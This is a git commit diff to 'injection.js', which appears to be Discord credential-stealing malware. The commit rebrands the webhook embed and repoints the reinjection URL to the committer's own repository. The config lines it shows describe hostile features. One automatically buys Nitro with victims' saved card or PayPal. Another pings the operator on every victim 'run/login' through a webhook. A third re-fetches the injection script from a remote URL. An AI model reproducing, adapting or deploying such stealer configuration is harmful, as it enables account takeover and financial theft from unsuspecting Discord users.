34927bb5378f7284a694510d4f647daebc47486c
KiriiFvk <130027163+KiriiFvk@users.noreply.github.com>
2023-04-06 19:05:11 +0200

    Update injection.js

--- injection.js
+++ injection.js
@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Sanae Injection', //name of the webhook thats gonna send the info
+  embed_name: 'YUMMI Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://media.discordapp.net/attachments/1089275224370991115/1093578170751537211/a_312b146bbdfe1064df6c71837cf26e44.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 0, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/KiriiFvk/ignore-injection/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
